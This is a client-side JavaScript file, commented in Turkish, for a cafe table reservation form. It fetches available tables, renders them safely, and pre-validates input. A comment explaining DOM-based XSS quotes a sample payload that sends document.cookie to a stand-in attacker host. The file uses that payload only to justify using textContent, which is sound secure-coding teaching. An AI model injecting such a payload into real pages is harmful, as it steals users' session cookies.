/* =====================================================================
   KAFE MASA REZERVASYON SISTEMI - MUSTERI ARAYUZU JAVASCRIPT
   ---------------------------------------------------------------------
   GOREVI
     Kullanici tarih / saat / sure / kisi sayisi sectiginde
     api/musait-masalar.php ucuna istek atmak, donen masalari kart
     listesi olarak cizmek ve secimi forma islemek.

   ---------------------------------------------------------------------
   *** EN ONEMLI UYARI ***

   Bu dosyadaki HICBIR kontrol GUVENLIK saglamaz.

   Buradaki dogrulamalar, sunucu dogrulamasinin YERINE DEGIL YANINA
   calisir. Sebebi cok basittir: JavaScript KULLANICININ bilgisayarinda
   calisir. Kullanici (ya da saldirgan) sunlari saniyeler icinde yapabilir:
     - Tarayici konsolunda bu dosyadaki fonksiyonlari degistirebilir,
     - DevTools ile <input> degerlerini elle duzenleyebilir,
     - JavaScript'i tamamen kapatip formu yine de gonderebilir,
     - Sayfayi hic acmadan curl ile dogrudan POST atabilir.

   Dolayisiyla buradaki kontrollerin tek amaci KULLANICI DENEYIMIDIR:
   sunucuya bosuna gidip gelmeden, aninda geri bildirim vermek.
   Gercek kural index.php icindeki "SUNUCU TARAFI DOGRULAMA" blogudur.
   ===================================================================== */

/*
  'use strict' (kati mod)
  Sessiz hatalari gercek hataya cevirir. En faydalisi: tanimlanmamis bir
  degiskene deger atamak (yazim hatasi) artik kazara global degisken
  uretmez, ReferenceError firlatir. Boylece "masalar" yerine "masaar"
  yazdiginizda kod sessizce yanlis calismak yerine hemen sikayet eder.
*/
'use strict';

(function () {
    // Tum kod bir IIFE (hemen calisan fonksiyon) icinde.
    // Neden? Iceride tanimlanan her degisken bu fonksiyona ait olur,
    // global "window" nesnesini kirletmez. Baska bir script'te ayni adla
    // bir degisken olsa bile catisma yasanmaz.

    // =================================================================
    // 1) ELEMANLARI BUL
    // =================================================================
    const form = document.getElementById('rezervasyonFormu');

    // Sayfada form yoksa (ornegin sorgulama sayfasindayiz) hicbir sey
    // yapmadan cikiyoruz. Bu kontrol olmasaydi asagidaki satirlar null
    // uzerinde calisip "Cannot read properties of null" hatasi verir ve
    // sayfadaki DIGER script'ler de durabilirdi.
    if (!form) {
        return;
    }

    const tarihEl      = document.getElementById('tarih');
    const baslangicEl  = document.getElementById('baslangic_saati');
    const sureEl       = document.getElementById('sure');
    const kisiEl       = document.getElementById('kisi_sayisi');
    const listeEl      = document.getElementById('masaListesi');
    const masaIdEl     = document.getElementById('masaId');
    const bitisBilgiEl = document.getElementById('bitisBilgisi');
    const uyariEl      = document.getElementById('formUyari');
    const gonderEl     = document.getElementById('gonderButonu');

    // API adresini ve onceki secimi HTML'den (data-* oznitelikleri)
    // okuyoruz. Adresi JS icine sabit yazmak, projeyi alt klasore
    // tasidiginizda bozulur; PHP tarafi dogru yolu zaten biliyor.
    const apiAdresi  = form.dataset.api;
    let seciliMasaId = form.dataset.seciliMasa || '';

    // Devam eden istegi iptal edebilmek icin (bkz. bolum 4).
    let acikIstek = null;
    let zamanlayici = null;


    // =================================================================
    // 2) KUCUK YARDIMCILAR
    // =================================================================

    /** '19:30' -> 1170 (gece yarisindan itibaren dakika) */
    function saatiDakikayaCevir(saat) {
        const parca = saat.split(':');
        return (parseInt(parca[0], 10) || 0) * 60 + (parseInt(parca[1], 10) || 0);
    }

    /** 1170 -> '19:30' */
    function dakikayiSaateCevir(dakika) {
        const sa = Math.floor(dakika / 60);
        const dk = dakika % 60;
        // padStart: tek haneli sayiyi '09' yapar. '9:0' gibi bozuk
        // bicimler API tarafinda dogrulamaya takilirdi.
        return String(sa).padStart(2, '0') + ':' + String(dk).padStart(2, '0');
    }

    /**
     * Bitis saatini baslangic + sure ile hesaplar.
     *
     * NOT: Bu deger forma GONDERILMEZ. PHP ayni hesabi kendisi yapar
     * (index.php, bolum 4). Burada sadece API sorgusu ve ekranda
     * "21:00'de biter" bilgisini gostermek icin uretiyoruz.
     */
    function bitisSaatiniHesapla() {
        if (!baslangicEl.value) {
            return '';
        }
        const sure = parseInt(sureEl.value, 10) || 0;
        return dakikayiSaateCevir(saatiDakikayaCevir(baslangicEl.value) + sure);
    }

    /** Liste alanina tek satirlik bir durum kutusu basar. */
    function durumGoster(html, hataMi) {
        listeEl.innerHTML =
            '<div class="kafe-durum-kutusu' + (hataMi ? ' hata' : '') + '">' +
            (hataMi ? '' : '<span class="kafe-bos-ikon" aria-hidden="true"></span>') +
            html + '</div>';
    }


    // =================================================================
    // 3) MASA KARTLARINI CIZ
    // =================================================================

    /**
     * Gelen masa dizisini kart listesine donusturur.
     *
     * ---------------------------------------------------------------
     * NEDEN innerHTML DEGIL, createElement + textContent?
     *
     * Kolay yol su olurdu:
     *     listeEl.innerHTML += '<span>' + masa.masa_adi + '</span>';
     *
     * masa_adi veritabanindan geliyor ve admin panelinden girilebiliyor.
     * Birisi masa adini soyle kaydederse:
     *
     *     <img src=x onerror="fetch('http://kotu.site?c='+document.cookie)">
     *
     * innerHTML bu metni ETIKET olarak yorumlar ve kod MUSTERININ
     * tarayicisinda calisir. Buna DOM tabanli XSS denir; PHP tarafinda
     * e() kullanmis olmaniz burada sizi KURTARMAZ, cunku deger HTML'e
     * PHP uzerinden degil JSON uzerinden geliyor.
     *
     * textContent ise atanan degeri HER ZAMAN duz yazi sayar; icindeki
     * "<" karakteri etiket baslangici olarak yorumlanmaz. Bu, istemci
     * tarafinin e() karsiligidir.
     * ---------------------------------------------------------------
     */
    function masalariCiz(masalar) {
        // Once temizle. Bos bir DocumentFragment'te birlestirip tek
        // seferde eklemek, her kart icin ayri DOM guncellemesi yapmaktan
        // (reflow) daha hizlidir.
        listeEl.innerHTML = '';
        const parca = document.createDocumentFragment();

        masalar.forEach(function (masa) {

            // Kartin kendisi bir <label>: tiklaninca icindeki radio
            // secilir. Klavye ile de calisir, ekstra JS gerekmez.
            const kart = document.createElement('label');
            kart.className = 'kafe-masa-karti';

            const radio = document.createElement('input');
            radio.type  = 'radio';
            radio.name  = 'masa_secim';   // ayni ada sahip radio'lar tek grup olur
            radio.value = masa.id;
            radio.checked = (String(masa.id) === String(seciliMasaId));

            if (radio.checked) {
                kart.classList.add('secili');
            }

            // --- Masa adi ---
            const ad = document.createElement('span');
            ad.className = 'kafe-masa-ad';
            ad.textContent = masa.masa_adi;   // <- kacislamanin yapildigi yer

            // --- Rozetler: kapasite + konum ---
            const rozetler = document.createElement('span');
            rozetler.className = 'kafe-masa-rozetler';

            const kapasite = document.createElement('span');
            kapasite.className = 'kafe-etiket';
            kapasite.textContent = masa.kapasite + ' kişilik';

            const konum = document.createElement('span');
            // ENUM degerini sinif adina cevirirken beyaz liste mantigi:
            // gelen deger 'dis' degilse her durumda 'ic' kabul ediyoruz.
            // Degeri dogrudan sinif adina yazmak, sunucudan beklenmedik
            // bir metin gelirse CSS'i bozardi.
            const disMi = (masa.konum === 'dis');
            konum.className = 'kafe-etiket ' + (disMi ? 'kafe-etiket-dis' : 'kafe-etiket-ic');
            konum.textContent = disMi ? 'Bahçe' : 'İç mekan';

            rozetler.appendChild(kapasite);
            rozetler.appendChild(konum);

            kart.appendChild(radio);
            kart.appendChild(ad);
            kart.appendChild(rozetler);

            // --- Doluluk ipucu ---
            // API 'dolu_araliklar' alanini metin olarak dondurur
            // ('12:00-14:00, 19:00-21:00') ya da kayit yoksa null.
            // Musteriye masanin gunun kalaninda ne zaman dolu oldugunu
            // gostermek, saat degistirme kararini kolaylastirir.
            if (masa.dolu_araliklar) {
                const dolu = document.createElement('span');
                dolu.className = 'kafe-masa-dolu';
                dolu.textContent = 'Bugün dolu: ' + masa.dolu_araliklar;
                kart.appendChild(dolu);
            }

            parca.appendChild(kart);
        });

        listeEl.appendChild(parca);
    }

    /**
     * Secim degistiginde kart vurgusunu ve gizli masa_id alanini gunceller.
     *
     * OLAY DELEGASYONU (event delegation):
     * Her radio'ya ayri ayri dinleyici baglamak yerine TEK dinleyiciyi
     * kapsayici listeye bagliyoruz. Avantaji: liste her arama sonrasi
     * bastan olusuyor; tek tek baglasaydik her yenilemede dinleyicileri
     * de yeniden baglamak (ve eskilerini temizlemek) gerekirdi.
     * 'change' olayi radio'dan yukari dogru kabarir (bubbling), biz de
     * yukarida yakaliyoruz.
     */
    listeEl.addEventListener('change', function (olay) {
        const hedef = olay.target;

        if (!hedef || hedef.name !== 'masa_secim') {
            return;
        }

        seciliMasaId    = hedef.value;
        masaIdEl.value  = hedef.value;   // forma gidecek olan gercek alan

        listeEl.querySelectorAll('.kafe-masa-karti').forEach(function (kart) {
            kart.classList.toggle('secili', kart.contains(hedef));
        });

        uyariGoster('');
    });


    // =================================================================
    // 4) MUSAIT MASALARI GETIR  (fetch akisi)
    // =================================================================
    function masalariGetir() {
        const tarih     = tarihEl.value;
        const baslangic = baslangicEl.value;
        const kisi      = kisiEl.value;
        const bitis     = bitisSaatiniHesapla();

        // Bitis bilgisini kullaniciya goster (form-text alani).
        if (bitisBilgiEl) {
            bitisBilgiEl.textContent = bitis ? ('Bitiş: ' + bitis) : '';
        }

        // --- On kontrol: eksik alan varsa istek ATMA ---
        // Sunucuya "tarih=&baslangic=" gibi anlamsiz bir istek gondermek
        // hem gereksiz yuk hem de kullaniciya gosterilecek anlamsiz bir
        // hata demektir.
        if (!tarih || !baslangic || !kisi) {
            listeEl.innerHTML =
                '<div class="kafe-bos-durum">' +
                '<span class="kafe-bos-ikon" aria-hidden="true"></span>' +
                '<strong>Önce zamanı seçin</strong>' +
                '<p class="mb-0">Müsait masalar, tarih, saat ve kişi sayısı girilince listelenir.</p>' +
                '</div>';
            return;
        }

        // ---------------------------------------------------------
        // ONCEKI ISTEGI IPTAL ET  (yaris durumu / race condition)
        //
        // Kullanici saati hizlica 19:00 -> 20:00 -> 21:00 yapabilir.
        // Uc istek birden yola cikar ve ag kosullari yuzunden SIRALARI
        // BOZULARAK donebilir: 21:00'in cevabi once, 19:00'inki sonra
        // gelirse ekranda 19:00'un masalari kalir ama <select>'te
        // 21:00 yazar. Kullanici yanlis listeden secim yapar.
        //
        // AbortController ile eski istegi iptal ediyoruz: sadece EN SON
        // istegin cevabi ekrana yazilir.
        // ---------------------------------------------------------
        if (acikIstek) {
            acikIstek.abort();
        }
        acikIstek = new AbortController();

        // --- Yukleniyor gostergesi ---
        // Kullanici bir sey olduguna dair geri bildirim gormezse
        // butona/secime tekrar tekrar basar.
        durumGoster(
            '<span class="spinner-border spinner-border-sm me-2" role="status" aria-hidden="true"></span>' +
            'Müsait masalar aranıyor...',
            false
        );

        // ---------------------------------------------------------
        // URL PARAMETRELERI
        // Elle "?tarih=" + tarih seklinde birlestirmek YANLISTIR:
        // deger icinde & veya bosluk varsa adres bozulur. URLSearchParams
        // her degeri dogru sekilde kodlar (PHP'deki u() karsiligi).
        // ---------------------------------------------------------
        const parametreler = new URLSearchParams({
            tarih: tarih,
            baslangic: baslangic,
            bitis: bitis,
            kisi_sayisi: kisi
        });

        fetch(apiAdresi + '?' + parametreler.toString(), {
            signal: acikIstek.signal,
            // Sunucunun "bu bir AJAX istegi" oldugunu anlayabilmesi ve
            // JSON beklendigini bilmesi icin.
            headers: { 'Accept': 'application/json' }
        })
            .then(function (yanit) {
                // ---------------------------------------------------
                // DIKKAT: fetch, 404 ve 500 gibi HTTP hatalarinda
                // REDDETMEZ (reject). Sadece AG hatasinda reddeder.
                // Yani .catch'e guvenip durum kodunu kontrol etmezseniz
                // 500 donen bir sayfayi "basarili" sanarsiniz.
                // Bu, fetch'in en sik yapilan kullanim hatasidir.
                //
                // API 400 durumunda da gecerli bir JSON govdesi
                // donduruyor ({"basarili":false,"hata":"..."}), bu yuzden
                // govdeyi her durumda okumaya calisiyoruz.
                // ---------------------------------------------------
                return yanit.json().catch(function () {
                    // Govde JSON degilse (ornegin PHP olumcul hata verip
                    // HTML basmissa) anlamli bir hata firlatalim.
                    throw new Error('Sunucudan beklenmeyen bir yanıt geldi.');
                });
            })
            .then(function (veri) {
                if (!veri || veri.basarili !== true) {
                    durumGoster(
                        (veri && veri.hata) ? metniKacisla(veri.hata) : 'Masalar getirilemedi.',
                        true
                    );
                    return;
                }

                const masalar = veri.masalar || [];

                // --- BOS SONUC DURUMU ---
                // Bos bir liste birakmak en kotu secimdir: kullanici
                // "yukleniyor mu, bozuk mu?" diye bekler. Ne oldugunu
                // ve ne yapmasi gerektigini soyluyoruz.
                if (masalar.length === 0) {
                    durumGoster(
                        '<strong>Bu saat aralığında müsait masa yok.</strong><br>' +
                        'Farklı bir saat, daha kısa bir süre veya başka bir tarih deneyebilirsiniz.',
                        false
                    );
                    masaIdEl.value = '';
                    seciliMasaId = '';
                    return;
                }

                masalariCiz(masalar);

                // Onceden secili masa artik listede yoksa (saat degisti,
                // masa doldu) gizli alani temizle. Temizlemezsek kullanici
                // ekranda hicbir sey secili gormedigi halde eski masa
                // forma gider - ve sunucu "masa dolu" hatasi dondurur.
                if (!listeEl.querySelector('input[name="masa_secim"]:checked')) {
                    masaIdEl.value = '';
                    seciliMasaId = '';
                }
            })
            .catch(function (hata) {
                // Iptal edilen istek de buraya duser; onu hata sayma.
                if (hata.name === 'AbortError') {
                    return;
                }

                durumGoster(
                    '<strong>Baglanti hatasi.</strong><br>' +
                    'Masa listesi alınamadı. İnternet bağlantınızı kontrol edip tekrar deneyin.',
                    true
                );
            });
    }

    /**
     * Sunucudan gelen hata metnini HTML'e basmadan once kacislar.
     * durumGoster() innerHTML kullandigi icin gerekli; API metinleri
     * bizim yazdigimiz sabitler olsa da "disaridan gelen veriyi
     * kacislamadan basma" kuralini istisnasiz uyguluyoruz.
     */
    function metniKacisla(metin) {
        const kutu = document.createElement('div');
        kutu.textContent = metin;
        return kutu.innerHTML;
    }


    // =================================================================
    // 5) OLAY DINLEYICILERI
    // =================================================================

    /*
      GECIKTIRME (debounce)
      Tarih alaninda kullanici gun/ay/yil yazarken 'change' birden fazla
      kez tetiklenebilir. Her tetiklemede istek atmak sunucuyu bosuna
      yorar. 250 ms beklemek, kullanici "durdugunda" tek istek atmayi
      saglar. Sure cok uzun olursa arayuz tembel hissettirir.
    */
    function gecikmeliGetir() {
        clearTimeout(zamanlayici);
        zamanlayici = setTimeout(masalariGetir, 250);
    }

    [tarihEl, baslangicEl, sureEl, kisiEl].forEach(function (el) {
        if (el) {
            el.addEventListener('change', gecikmeliGetir);
        }
    });


    // =================================================================
    // 6) GONDERIM ONCESI ON DOGRULAMA
    // -----------------------------------------------------------------
    // Tekrar hatirlatma: buradaki kontroller SUNUCUYU RAHATLATMAK ve
    // kullaniciya aninda geri bildirim vermek icindir. index.php ayni
    // kontrollerin TAMAMINI bagimsiz olarak yeniden yapar. Bu blogu
    // silseniz sistem yine guvenlidir; sadece kullanici deneyimi duser.
    // =================================================================
    function uyariGoster(mesaj) {
        if (uyariEl) {
            uyariEl.textContent = mesaj;
            uyariEl.className = mesaj ? 'small text-danger fw-semibold' : 'small text-muted';
        }
    }

    form.addEventListener('submit', function (olay) {
        const eksikler = [];

        if (!tarihEl.value)     { eksikler.push('tarih'); }
        if (!baslangicEl.value) { eksikler.push('saat'); }
        if (!masaIdEl.value)    { eksikler.push('masa'); }
        if (document.getElementById('musteri_adi').value.trim().length < 3) {
            eksikler.push('ad soyad');
        }

        // Telefonun sadece rakamlarini sayiyoruz: kullanici bosluk ve
        // parantezle yazmis olabilir. Ayni mantigin sunucu tarafi
        // karsiligi telefon_normalize() fonksiyonudur.
        const telRakam = document.getElementById('musteri_telefon').value.replace(/\D+/g, '');
        if (telRakam.length < 10) {
            eksikler.push('telefon');
        }

        if (eksikler.length > 0) {
            // preventDefault: formun sunucuya gitmesini engeller.
            olay.preventDefault();
            uyariGoster('Eksik alan: ' + eksikler.join(', ') + '.');

            // Kullaniciyi ilk eksik alana goturmek, uzun formlarda
            // "hata nerede?" arayisini bitirir.
            if (!masaIdEl.value && listeEl) {
                listeEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
            }
            return;
        }

        // ---------------------------------------------------------
        // CIFT GONDERIM KILIDI
        // Yavas baglantida kullanici butona iki kez basabilir ve iki
        // POST yola cikar. Butonu devre disi birakmak bunu onler.
        //
        // NOT: Bu da bir KOLAYLIKTIR, garanti degildir. Asil koruma
        // sunucudadir: RezervasyonRepository cakisma kontrolu yapar ve
        // ikinci kayit "masa dolu" hatasiyla reddedilir.
        // ---------------------------------------------------------
        if (gonderEl) {
            gonderEl.disabled = true;
            gonderEl.textContent = 'Kaydediliyor...';
        }
    });


    // =================================================================
    // 7) ILK CALISMA
    // -----------------------------------------------------------------
    // Sunucu dogrulama hatasi verip formu geri gonderdiyse tarih/saat
    // alanlari DOLU gelir. Bu durumda masa listesini otomatik olarak
    // yeniden yukluyoruz; aksi halde kullanici "masa secin" hatasi
    // gorur ama ortada liste olmaz.
    // =================================================================
    if (tarihEl.value && baslangicEl.value) {
        masalariGetir();
    }
})();
